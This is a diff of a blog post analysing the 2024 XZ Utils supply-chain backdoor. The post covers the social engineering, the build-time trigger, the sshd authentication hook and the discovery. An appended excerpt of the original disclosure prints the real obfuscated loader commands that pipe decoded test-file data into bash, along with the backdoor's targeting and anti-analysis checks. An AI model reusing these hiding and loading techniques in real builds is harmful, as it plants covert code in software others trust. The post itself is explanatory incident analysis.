@@ -8,7 +8,7 @@
   <meta name="referrer" content="strict-origin-when-cross-origin" />
   <meta http-equiv="Permissions-Policy" content="camera=(), microphone=(), geolocation=()" />
   <title>XZ Utils Backdoor — Blog</title>
-  <meta name="description" content="XZ Utils Backdoor — Thoughts &amp; Notes">
+  <meta name="description" content="XZ Utils Backdoor — A Social-Engineered Supply-Chain Backdoor">
   <link rel="icon" href="../favicon.png" type="image/png" sizes="32x32">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -75,75 +75,422 @@
       <hr class="writeup-divider">
 
       <article class="writeup-body">
-        <p>One of my favourite quotes from Darknet Diaries is <em>&quot;..when truth is stranger than fiction&quot;</em>. That encapsulates many of the incidents and stories we hear and see when dealing with cyber. It&#39;s both exhilarating and scary.</p>
-<p>Advanced attacks where social engineering acts as a central aspect of the attack path are captivating to me. It taps into the human psyche and emphasizes what I consider to be a fact: every single one of us is inherently &quot;vulnerable&quot;. Given the right conditions at the right time, I believe all of us can be &quot;exploited&quot;.</p>
-<p>The XZ Utils backdoor incident of 2024 brought all of this together. Technical prowess and creativity of a nation-state actor, an exceptionally deterministic social engineering operation that played out over <em>years</em>, and a happy ending handed to us by a German developer who was annoyed that SSH took 500ms longer to authenticate. Thank you, Germany, and your engineering precision.</p>
+        <p>One of my favourite quotes from <em>Darknet Diaries</em> is <em>&quot;when truth is stranger than fiction.&quot;</em> It captures many of the incidents we encounter in cybersecurity. Some of them sound like something out of a thriller novel until you realize they actually happened.</p>
+<p>That mixture is both fascinating and unsettling.</p>
+<p>Advanced attacks where social engineering plays a central role in the attack path are especially interesting to me. They highlight something I consider a simple but uncomfortable truth: every one of us is inherently vulnerable. Given the right circumstances, timing, and pressure, people can be manipulated.</p>
+<p>The <strong>XZ Utils backdoor incident in 2024</strong> brought all of these elements together. It involved impressive technical creativity, a long and methodical social engineering campaign that unfolded over several years, and ultimately a fortunate discovery by a developer who noticed that SSH authentication suddenly took about <strong>500 milliseconds longer than usual</strong>.</p>
+<p>Sometimes half a second is enough to change the course of the internet.</p>
+<blockquote>
+<p><strong>Note:</strong> I am not deeply familiar with some of the most technical aspects of this incident, particularly around IFUNC symbol resolution and low-level dynamic linker mechanics. Some elements in this post are simplified. For excellent deep-dives, I&#39;d recommend <a href="https://www.youtube.com/watch?v=aoag03mSuXQ&t=2909s">Veritasium&#39;s more approachable video on the incident</a> and/or <a href="https://www.youtube.com/watch?v=Q6ovtLdSbEA&t=3651s">Denzel Farmer&#39;s more detailed technical lecture of the backdoor</a>.</p>
+</blockquote>
 <h2>Supply Chain Attack via Dependencies</h2>
-<p>Most people don&#39;t think about <code>xz</code> or <code>liblzma</code>. It&#39;s a compression library, one of many quiet utilities that lives deep in the dependency tree of virtually every Linux distribution. But here&#39;s the thing: <code>liblzma</code> is linked by <code>libsystemd</code>, and <code>libsystemd</code> is linked by OpenSSH&#39;s <code>sshd</code> on many distros (particularly those that ship patched versions of OpenSSH integrating with systemd for notifications and socket activation).</p>
-<p>That&#39;s the attack surface. Not SSH itself, but a compression library <em>two layers down</em> the dependency chain that SSH never explicitly asked for.</p>
-<p>This is the fundamental challenge of supply chain security. Modern software doesn&#39;t just depend on what you think it depends on. It depends on what <em>those</em> things depend on, and what <em>those</em> depend on, recursively down the stack. Keeping an accurate, real-time mental model of every transitive dependency, its maintainers, its release process, and its integrity — that&#39;s not a task any single human or team can realistically do at scale. Yet that is exactly what would be needed to catch something like this before it ships.</p>
+<p>Most people never think about <code>xz</code> or <code>liblzma</code> when talking about SSH.</p>
+<p>It is simply a compression library, one of many small utilities buried deep inside the dependency trees of most Linux distributions.</p>
+<p>However, in many systems <code>liblzma</code> is linked by <code>libsystemd</code>, and <code>libsystemd</code> is in turn used by OpenSSH&#39;s <code>sshd</code> in distributions that integrate SSH with systemd features such as socket activation or service notifications.</p>
+<p>This creates an unexpected path.</p>
+<p>SSH itself did not depend on XZ. Yet the runtime environment ended up loading code from that library.</p>
+<p>The attack surface was therefore not SSH itself, but a compression library sitting several layers down the dependency chain that SSH never explicitly requested.</p>
+<p>This illustrates one of the core problems in supply chain security. Modern software rarely depends only on what developers believe it depends on. It depends on what those dependencies depend on, and what <em>those</em> dependencies depend on, recursively.</p>
+<p>Keeping a complete mental model of every transitive dependency, every maintainer, every build step, and every release artifact across that entire stack is not an easy task.</p>
 <h2>Phase 1: The Long Con — Social Engineering Operation</h2>
-<p>This is what makes this incident extraordinary. It wasn&#39;t a zero-day exploit or a stolen credential. It was patience.</p>
-<p>A persona going by <strong>Jia Tan</strong> (GitHub handle <code>JiaT75</code>) began contributing to the XZ Utils project around <strong>2021</strong>. Early contributions were harmless and helpful — fixing bugs, cleaning code, genuinely useful work. The kind of contributions any maintainer would welcome.</p>
-<p>Simultaneously, the original XZ maintainer, <strong>Lasse Collin</strong>, started receiving pressure from other accounts, complaining about slow patch reviews and suggesting the project needed another maintainer. Some of these accounts appeared to exist solely for this purpose — manufactured social pressure applied over months.</p>
-<p>It worked. By <strong>2023</strong>, Jia Tan had earned enough trust to receive commit access. By early <strong>2024</strong>, they were effectively co-maintaining the project.</p>
-<p>The entire social engineering operation was designed to exploit one of the most human dynamics in open source: a lone, overwhelmed maintainer who genuinely needed help, being offered it by someone who had put in the work. There was no reason to say no. That&#39;s what makes it so effective and so difficult to defend against.</p>
+<p>What makes this incident remarkable is that it was not primarily a technical exploit.</p>
+<p>It was patience.</p>
+<p>A developer using the name <strong>Jia Tan</strong> (GitHub handle <code>JiaT75</code>) began contributing to the XZ Utils project around <strong>2021</strong>.</p>
+<p>The initial contributions looked entirely normal. Bug fixes, documentation improvements, build system cleanup, and small technical improvements. The sort of contributions maintainers are usually happy to receive.</p>
+<p>At the same time, several other accounts began appearing in mailing lists and issue discussions. These accounts complained about slow patch review times and suggested that the project needed additional maintainers to keep up with development.</p>
+<p>Some of these accounts later appeared to have been created primarily to apply this pressure.</p>
+<p>Over time this created a subtle dynamic. The original maintainer, <strong>Lasse Collin</strong>, had been maintaining the project largely alone for years. Like many open-source maintainers, he was dealing with a large workload and limited time.</p>
+<p>Eventually the new contributor who had been consistently submitting useful patches appeared to be a natural choice to help.</p>
+<p>By <strong>2023</strong>, Jia Tan had obtained commit access. By early <strong>2024</strong>, they were effectively acting as a co-maintainer.</p>
+<p>From a community perspective, nothing looked suspicious. A contributor had spent years helping the project and gradually earned trust.</p>
+<p>That is exactly how open source normally works.</p>
+<p>Which is also why it worked so well.</p>
 <h2>Phase 2: Laying the Groundwork</h2>
-<p>With maintainer access secured, the technical operation began. But it wasn&#39;t rushed. The changes came in incrementally, each one looking reasonable in isolation:</p>
+<p>Once maintainer access was secured, the technical preparation began.</p>
+<p>The changes were subtle and introduced gradually.</p>
+<p>Two test files in the source tree carried the hidden payload material:</p>
 <ul>
-<li><p><strong>Test infrastructure manipulation</strong> — Jia Tan added binary test fixture files (<code>.xz</code> compressed blobs) to the repository. These looked like legitimate test cases for the compression library. In reality, they contained the obfuscated payload that would later be extracted and injected during the build process.</p>
-</li>
-<li><p><strong>Build system modifications</strong> — Subtle changes were made to the autotools build scripts (<code>configure</code>, <code>Makefile.in</code>, and related m4 macros). These modifications conditionally executed during <code>make</code> only under specific circumstances — specifically when building on x86-64 Linux with GCC and when the build environment looked like a Debian or RPM package build (not a developer build).</p>
-</li>
-<li><p><strong>Gradual normalization</strong> — Each change individually passed review. The test files were &quot;just test data&quot;. The build changes were &quot;just cleanup&quot;. The layering was so gradual that no single commit raised alarm bells.</p>
-</li>
+<li><code>tests/files/bad-3-corrupt_lzma2.xz</code></li>
+<li><code>tests/files/good-large_compressed.lzma</code></li>
 </ul>
+<p>By themselves, those files were not enough to activate the backdoor.</p>
+<p>The important trigger was a <strong>modified <code>build-to-host.m4</code> file in the 5.6.0 and 5.6.1 release tarballs</strong>. Andres Freund&#39;s disclosure notes that this file was present in the upstream release tarballs but <strong>not</strong> in the public Git repository.</p>
+<p>That matters because it means someone inspecting only Git would miss a critical piece of the attack chain.</p>
+<p>When the tarball was used to build the package, the modified build logic extracted a script that unpacked data from those test files and altered the <code>liblzma</code> build.</p>
+<p>The trigger conditions were selective. According to Freund&#39;s analysis, the malicious path was aimed at builds on:</p>
+<ul>
+<li><strong>x86-64 Linux</strong></li>
+<li><strong>glibc-based systems</strong></li>
+<li><strong>GCC / GNU ld toolchains</strong></li>
+<li><strong>distribution-style package builds</strong>, especially where Debian or RPM packaging indicators were present</li>
+</ul>
+<p>Typical developer builds from Git were much less likely to trigger it.</p>
+<p>That selectivity is one of the reasons the issue stayed hidden long enough to become dangerous.</p>
+<p>Each individual change looked harmless. Test files appeared to be normal data. Build script modifications looked like routine maintenance.</p>
+<p>Spread over months, nothing stood out enough to raise suspicion.</p>
 <h2>Phase 3: The Backdoor</h2>
-<p>The actual backdoor was elegant in a deeply uncomfortable way.</p>
-<p>During the build process of the tainted release (versions <strong>5.6.0</strong> and <strong>5.6.1</strong>), the malicious build scripts would:</p>
+<p>The malicious code is known to have been included in the <strong>5.6.0 and 5.6.1 release tarballs</strong> of XZ Utils.</p>
+<p>During the affected build process, the injected script extracted and reconstructed malicious object code from the disguised test files and inserted it into the built <code>liblzma</code> library.</p>
+<p>That alone was not enough to impact SSH everywhere.</p>
+<p>OpenSSH does <strong>not</strong> normally load <code>liblzma</code> directly. The issue became relevant on systems where a common downstream patch caused <code>sshd</code> to use <code>libsystemd</code>, which in turn pulled in <code>liblzma</code>.</p>
+<p>Under those circumstances, the modified <code>liblzma</code> could interfere with <strong>OpenSSH authentication</strong>.</p>
+<p>At a simplified but confirmed level, the mechanism worked like this:</p>
 <ol>
-<li><strong>Extract a hidden payload</strong> from the binary test files using a chain of shell commands that unpacked, decoded, and decrypted the obfuscated data.</li>
-<li><strong>Inject a compiled object file</strong> into <code>liblzma</code> during linking — this object hooked into the library&#39;s symbol resolution.</li>
-<li><strong>Hijack the authentication path</strong> — the injected code patched <code>RSA_public_decrypt()</code> in the running <code>sshd</code> process through indirect function resolution (<code>IFUNC</code>). This allowed the attacker to intercept authentication and execute arbitrary commands before the real authentication check ran.</li>
+<li>The malicious code first hijacked IFUNC-related resolver behavior inside <code>liblzma</code> during process startup.</li>
+<li>It then used the dynamic linker&#39;s audit-related machinery to watch symbol binding in <code>sshd</code>.</li>
+<li>When <code>RSA_public_decrypt()</code> was resolved, the backdoor redirected that call to attacker-controlled code.</li>
 </ol>
-<p>The result: <strong>a pre-auth remote code execution backdoor in SSH</strong>, triggered by a specially crafted public key sent during connection. Anyone with the right key could authenticate to any affected <code>sshd</code> without credentials.</p>
-<p>At a very high level, the payload logic looked something like this:</p>
+<p>Freund&#39;s analysis showed this redirection happening in the <code>sshd</code> authentication path. He was careful not to claim every detail of the final payload behavior was fully reverse engineered at the time, but he concluded it likely enabled unauthorized access or remote code execution in a pre-authentication context.</p>
+<p>Conceptually, the idea is simpler than the implementation:</p>
 <pre><code class="language-text">Client connects to sshd
-  |
-  v
+        |
+        v
+  patched sshd loads libsystemd
+          |
+          v
+   libsystemd loads liblzma
+          |
+          v
   sshd reaches RSA verification
-  |
-  v
-backdoored liblzma hook runs first
-  |
-  v
-Checks for attacker-controlled auth pattern
-  |
+        |
+        v
+backdoored liblzma redirects
+RSA_public_decrypt()
+        |
+        v
+Checks for a hand-crafted
+ RSA certificate carrying
+ signed attacker input
+        |
    +----+----+
    |         |
   Yes        No
    |         |
    v         v
-Bypass /     Continue normal
-redirect     SSH auth flow
-auth path
+Potentially alter   Continue normal
+auth behavior       SSH auth flow
 </code></pre>
-<p>That is simplified, but the core idea is the same: the malicious code gets a chance to inspect the authentication path first. If the incoming material matches what the attacker expects, it diverts execution. If not, <code>sshd</code> continues as normal, which is part of what made the backdoor so hard to spot in ordinary use.</p>
-<p>And it only activated on x86-64 Debian/Ubuntu-style systems building packages. Developer machines running <code>./configure &amp;&amp; make</code> from source wouldn&#39;t trigger it. CI running tests wouldn&#39;t trigger it. Only the package build pipeline would produce the backdoored binary. That&#39;s targeting with surgical precision.</p>
+<p>In plain terms, the malicious <code>liblzma</code> code got a chance to interfere right where SSH was verifying authentication data.</p>
+<p>If the incoming authentication data did not match what the backdoor expected, SSH continued normally, which helped the compromise stay hidden.</p>
+<p>This conditional behavior is part of what made the backdoor so difficult to notice in regular use.</p>
+<p>It also depended on a fairly specific chain of circumstances: the compromised release tarball, the right build environment, the resulting malicious <code>liblzma</code>, and an SSH build that loaded <code>libsystemd</code> and therefore <code>liblzma</code>.</p>
+<p>That combination explains why the threat was severe while also not instantly obvious across every Linux system.</p>
 <h2>Phase 4: Discovery — 500ms That Saved the Internet</h2>
-<p>In <strong>March 2024</strong>, <strong>Andres Freund</strong>, a PostgreSQL developer at Microsoft, noticed something that would&#39;ve gone past most people: his SSH logins were taking about <strong>500ms longer</strong> than expected. That&#39;s it — half a second.</p>
-<p>Instead of shrugging it off, he dug in. He profiled <code>sshd</code>, traced the latency to <code>liblzma</code>, and eventually uncovered the full backdoor chain. He disclosed it to the <code>oss-security</code> mailing list on <strong>March 29, 2024</strong>, and the security world collectively lost its mind.</p>
-<p>One detail I really like from Andres&#39; write-up is that the strange over-obfuscation was part of what made the whole thing stand out. If the payload had been cleaner and less bizarre, it may well have blended into the noise for longer. Sometimes attackers get caught not because they are unsophisticated, but because they become <em>too</em> weird.</p>
-<p>The vulnerability was assigned <strong>CVE-2024-3094</strong> with a CVSS score of <strong>10.0</strong> — the maximum.</p>
-<p>The timing was extraordinary. The backdoored versions had just started to land in unstable/testing branches of major distros. Debian Sid, Fedora Rawhide and 40 beta, openSUSE Tumbleweed, and Arch had pulled the tainted versions. If the discovery had been even a few weeks later, these versions would have migrated to stable releases, potentially affecting millions of systems.</p>
-<p>One developer&#39;s instinct to investigate a half-second delay quite literally prevented what could have been one of the most devastating supply chain compromises in history.</p>
+<p>In <strong>March 2024</strong>, <strong>Andres Freund</strong>, a PostgreSQL developer working at Microsoft, noticed something unusual.</p>
+<p>SSH logins on his system were taking roughly <strong>half a second longer</strong> than expected.</p>
+<p>That small delay might not have caught most people&#39;s attention.</p>
+<p>Instead of ignoring it, he began investigating. Profiling <code>sshd</code> eventually led him to unexpected behavior originating from <code>liblzma</code>.</p>
+<p>Following that trail ultimately revealed the entire backdoor.</p>
+<p>Freund disclosed the findings on the <strong>oss-security mailing list on March 29, 2024</strong>, triggering a rapid response across the Linux ecosystem.</p>
+<p>The vulnerability was assigned <strong>CVE-2024-3094</strong> with a <strong>CVSS score of 10.0</strong>.</p>
+<p>At the time of discovery the compromised versions had already been incorporated into development branches of several distributions including <strong>Debian Sid</strong>, <strong>Fedora Rawhide</strong>, <strong>Fedora 40 beta</strong>, <strong>openSUSE Tumbleweed</strong>, and <strong>Arch Linux</strong>.</p>
+<p>Fortunately they had not yet propagated widely into stable releases.</p>
+<p>If discovery had occurred even a few weeks later, millions of systems could have been affected.</p>
 <h2>Summary</h2>
-<p>This incident reveals uncomfortable truths at every layer:</p>
-<p><strong>The malicious maintainer problem is nearly unsolvable.</strong> Jia Tan did everything right by open-source community standards — they contributed consistently, earned trust organically, and were <em>invited</em> to maintain. Every code review process, every contributor vetting heuristic, every web of trust model struggles against someone willing to invest years of patient, legitimate work. The trust model of open source depends on maintainers being trustworthy, and when that assumption fails, the blast radius is enormous.</p>
-<p><strong>Dependencies are deeply, recursively dangerous.</strong> SSH didn&#39;t depend on <code>xz</code>. SSH depended on <code>systemd</code> notifications, which depended on <code>libsystemd</code>, which depended on <code>liblzma</code>, which is part of <code>xz</code>. Nobody installing OpenSSH was thinking about their compression library dependency chain. And yet that chain is what carried the backdoor into the most security-critical daemon on most Linux systems. You could audit SSH and systemd to death and still not catch a threat living two links down. Oh, and speaking of systemd — this whole attack vector only existed because systemd being systemd had to pull in yet another dependency it arguably didn&#39;t need. Some things never change.</p>
-<p><strong>The discovery was pure luck and individual brilliance.</strong> We were saved not by any automated tool, security audit, package signing check, or reproducible build verification. We were saved by one person noticing a half-second delay and being stubborn enough to trace it. That&#39;s not a security model — that&#39;s a lottery.</p>
-<p>And here&#39;s the thing that sits with me the most: <strong>our public digital infrastructure fundamentally relies on the backs of highly skilled volunteers</strong>. People who create and maintain passion projects, giving all of us the tools we build on, at no cost. Lasse Collin maintained XZ Utils essentially alone for years. That isolation is exactly what made the social engineering possible.</p>
-<p>Companies that build billion-dollar products on open-source foundations have a responsibility to support the maintainers behind them. We need to make open-source contribution more sustainable and more rewarding for those who&#39;ve poured significant hours, years even, into solving problems that all of us benefit from. Because right now, the security of critical infrastructure often depends on whether one overworked volunteer happens to have a good week.</p>
+<p>This incident reveals several uncomfortable realities.</p>
+<p>The <strong>malicious maintainer problem</strong> is extremely difficult to defend against. Jia Tan behaved exactly as a normal contributor should: providing useful patches, earning trust, and gradually gaining responsibility. Open source depends on trust relationships between maintainers and contributors. When that trust is exploited, the potential impact becomes enormous.</p>
+<p><strong>Dependencies are deeply, recursively dangerous.</strong> SSH did not depend on XZ directly. SSH depended on systemd notifications, which depended on <code>libsystemd</code>, which depended on <code>liblzma</code>, which is part of XZ. That dependency chain quietly carried malicious code into one of the most security-critical services on most Linux systems.</p>
+<p>You could audit SSH and systemd extensively and still miss a threat living two layers deeper in the stack.</p>
+<p>And, inevitably, systemd managed to appear in the middle of the story.</p>
+<p>The discovery itself relied heavily on <strong>individual curiosity and persistence</strong>. There was no automated scanner that detected the backdoor. It was uncovered because one developer noticed a small performance anomaly and decided to investigate further.</p>
+<p>That is not exactly a scalable security model.</p>
+<p>This case highlights something that often goes unnoticed: a large portion of our global digital infrastructure depends on the work of <strong>open-source maintainers</strong>, many of whom are volunteers maintaining complex projects in their spare time.</p>
+<p>Lasse Collin maintained XZ Utils largely alone for years.</p>
+<p>That situation is not unusual in open source. Passion projects maintained by a handful of people quietly underpin enormous parts of the modern internet.</p>
+<p>Organizations that build products and infrastructure on top of these projects benefit immensely from that work. Supporting maintainers, whether financially, through engineering resources, or through security review efforts, would help make the ecosystem more sustainable.</p>
+<p>Because right now, the stability and security of critical infrastructure sometimes depends on whether a single overworked maintainer happens to have enough time that week.</p>
+<h2>Source Context</h2>
+<p>To show how this incident was initially communicated and how the broader community started analyzing it, I&#39;m including an excerpt of the raw source context below as a reference block. This is not meant to be read straight through like the rest of the post, but it helps show the research trail from the initial oss-security disclosure into later technical writeups.</p>
+<pre><code class="language-text">[Openwall](https://www.openwall.com/) 
+[Products](https://www.openwall.com/)
+[Services](https://www.openwall.com/services/)
+Publications
+Resources
+[What&#39;s new](https://www.openwall.com/news)
+
+[Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net/)[[&lt;prev]](https://www.openwall.com/lists/oss-security/2024/03/29/3) [[next&gt;]](https://www.openwall.com/lists/oss-security/2024/03/29/5) [[thread-next&gt;]](https://www.openwall.com/lists/oss-security/2024/03/29/5) [[day]](https://www.openwall.com/lists/oss-security/2024/03/29/) [[month]](https://www.openwall.com/lists/oss-security/2024/03/) [[year]](https://www.openwall.com/lists/oss-security/) [[list]](https://www.openwall.com/lists/oss-security/) Message-ID: &lt;20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de&gt;
+Date: Fri, 29
+Mar 2024 08:51:26 -0700
+From: Andres Freund &lt;andres@...razel.de&gt;
+To:
+oss-security@...ts.openwall.com
+Subject: backdoor in upstream xz/liblzma leading to ssh
+server compromise
+
+Hi,
+
+After observing a few odd symptoms around liblzma (part of
+the xz package) on
+Debian sid installations over the last weeks (logins with ssh
+taking a lot of
+CPU, valgrind errors) I figured out the answer:
+
+The upstream xz
+repository and the xz tarballs have been backdoored.
+
+At first I thought this
+was a compromise of debian&#39;s package, but it turns out
+to be upstream.
+
+
+==
+Compromised Release Tarball ==
+
+One portion of the backdoor is *solely in the
+distributed tarballs*. For
+easier reference, here&#39;s a link to debian&#39;s import of the
+tarball, but it is
+also present in the tarballs for 5.6.0 and 5.6.1:
+
+[https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63](https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63)
+
+That line is *not* in the upstream source of build-to-host, nor
+is
+build-to-host used by xz in git.  However, it is present in the tarballs
+released upstream,
+except for the &quot;source code&quot; links, which I think github
+generates directly
+from the repository contents:
+
+[https://github.com/tukaani-project/xz/releases/tag/v5.6.0](https://github.com/tukaani-project/xz/releases/tag/v5.6.0)
+[https://github.com/tukaani-project/xz/releases/tag/v5.6.1](https://github.com/tukaani-project/xz/releases/tag/v5.6.1)
+
+
+This injects an obfuscated script to be executed at the end of configure.
+This
+script is fairly obfuscated and data from &quot;test&quot; .xz files in the
+repository.
+
+
+This script is executed and, if some preconditions match,
+modifies
+$builddir/src/liblzma/Makefile to contain
+
+am__test =
+bad-3-corrupt_lzma2.xz
+...
+am__test_dir=$(top_srcdir)/tests/files/$(am__test)
+...
+sed rpath $(am__test_dir) |
+$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
+
+
+which ends up as
+...; sed rpath
+../../../tests/files/bad-3-corrupt_lzma2.xz | tr &quot;	 \-_&quot; &quot; 	_\-&quot; | xz -d | /bin/bash &gt;/dev/null
+2&gt;&amp;1; ...
+
+Leaving out the &quot;| bash&quot; that produces
+
+####Hello####
+#��Z�.hj�
+eval
+`grep ^srcdir= config.status`
+if test -f ../../config.status;then
+eval `grep
+^srcdir= ../../config.status`
+srcdir=&quot;../../$srcdir&quot;
+fi
+export i=&quot;((head -c +1024
+&gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head
+-c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c
++2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
+&gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c
++1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048
+&amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp;
+head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024
+&gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp;
+(head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head
+-c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)&quot;;(xz -dc
+$srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr
+&quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1
+-dc|/bin/sh
+####World####
+
+After de-obfuscation this leads to the attached injected.txt.
+
+
+==
+Compromised Repository ==
+
+The files containing the bulk of the exploit are in an
+obfuscated form in
+  tests/files/bad-3-corrupt_lzma2.xz
+ 
+tests/files/good-large_compressed.lzma
+committed upstream. They were initially added in
+[https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0](https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0)
+
+Note that the files were not even used for any &quot;tests&quot; in
+5.6.0.
+
+
+Subsequently the injected code (more about that below) caused valgrind errors
+and crashes
+in some configurations, due the stack layout differing from what
+the backdoor was
+expecting.  These issues were attempted to be worked around
+in 5.6.1:
+
+[https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad](https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad)
+[https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f](https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f)
+[https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92](https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92)
+
+For which the exploit code was then adjusted:
+[https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89](https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89)
+
+Given the activity over several weeks, the committer is either
+directly
+involved or there was some quite severe compromise of their
+system. Unfortunately the
+latter looks like the less likely explanation, given
+they communicated on
+various lists about the &quot;fixes&quot; mentioned above.
+
+
+Florian Weimer first extracted the
+injected code in isolation, also attached,
+liblzma_la-crc64-fast.o, I had only
+looked at the whole binary. Thanks!
+
+
+== Affected Systems ==
+
+The attached
+de-obfuscated script is invoked first after configure, where it
+decides whether to
+modify the build process to inject the code.
+
+These conditions include targeting
+only x86-64 linux:
+        if ! (echo &quot;$build&quot; | grep -Eq &quot;^x86_64&quot; &gt; /dev/null 2&gt;&amp;1)
+&amp;&amp; (echo &quot;$build&quot; | grep -Eq &quot;linux-gnu{{CONTENT}}quot; &gt; /dev/null 2&gt;&amp;1);then
+
+Building with
+gcc and the gnu linker
+        if test &quot;x$GCC&quot; != &#39;xyes&#39; &gt; /dev/null 2&gt;&amp;1;then
+   
+exit 0
+        fi
+        if test &quot;x$CC&quot; != &#39;xgcc&#39; &gt; /dev/null 2&gt;&amp;1;then
+        exit 0
+   
+fi
+        LDv=$LD&quot; -v&quot;
+        if ! $LDv 2&gt;&amp;1 | grep -qs &#39;GNU ld&#39; &gt; /dev/null 2&gt;&amp;1;then
+
+   exit 0
+
+Running as part of a debian or RPM package build:
+        if test -f
+&quot;$srcdir/debian/rules&quot; || test &quot;x$RPM_ARCH&quot; = &quot;xx86_64&quot;;then
+
+Particularly the
+latter is likely aimed at making it harder to reproduce the
+issue for
+investigators.
+
+
+Due to the working of the injected code (see below), it is likely the
+backdoor
+can only work on glibc based systems.
+
+
+Luckily xz 5.6.0 and 5.6.1 have not
+yet widely been integrated by linux
+distributions, and where they have, mostly in
+pre-release versions.
+
+
+== Observing Impact on openssh server ==
+
+With the
+backdoored liblzma installed, logins via ssh become a lot slower.
+
+time ssh
+nonexistant@...alhost
+
+before:
+nonexistant@...alhost: Permission denied
+(publickey).
+
+before:
+real	0m0.299s
+user	0m0.202s
+sys	0m0.006s
+
+after:
+nonexistant@...alhost:
+Permission denied (publickey).
+
+real	0m0.807s
+user	0m0.202s
+sys	0m0.006s
+
+
+openssh
+does not directly use liblzma. However debian and several other
+distributions
+patch openssh to support systemd notification, and libsystemd
+does depend on
+lzma.
+
+
+Initially starting sshd outside of systemd did not show the slowdown,
+despite
+the backdoor briefly getting invoked. This appears to be part of
+some
+countermeasures to make analysis harder.
+
+Observed requirements for the exploit:
+a) TERM
+environment variable is not set
+b) argv[0] needs to be /usr/sbin/sshd
+c)
+LD_DEBUG, LD_PROFILE are not set
+d) LANG needs to be set
+e) Some debugging
+environments, like rr, appear to be detected. Plain gdb
+   appears to be detected in some
+situations, but not others
+
+To reproduce outside of systemd, the server can be
+started with a clear
+environment, setting only the required variable:
+
+env -i
+LANG=en_US.UTF-8 /usr/sbin/sshd -D
+
+
+In fact, openssh does not need to be started as
+a server to observe the
+slowdown:
+
+slow:
+env -i LANG=C /usr/sbin/sshd -h
+
+(about
+0.5s on my older system)
+
+
+fast:
+env -i LANG=C TERM=foo /usr/sbin/sshd -h
+env
+-i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
+...
+
+(about 0.01s on the same
+system)
+
+
+It&#39;s possible that argv[0] other /usr/sbin/sshd also would have effect -
+there
+are obviously lots of servers linking to libsystemd.
+</code></pre>
+<p>I&#39;ll cut the disclosure here but:</p>
+<p>You can view the full oss-security disclosure here: <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">Openwall oss-security post</a></p>
+<p>You can view the broader community FAQ here: <a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27">Sam James&#39; xz backdoor FAQ</a></p>
+<p>You can view the bash-stage reverse engineering here: <a href="https://gynvael.coldwind.pl/?lang=en&id=782">Gynvael Coldwind&#39;s analysis</a></p>
 
       </article>
     </div>
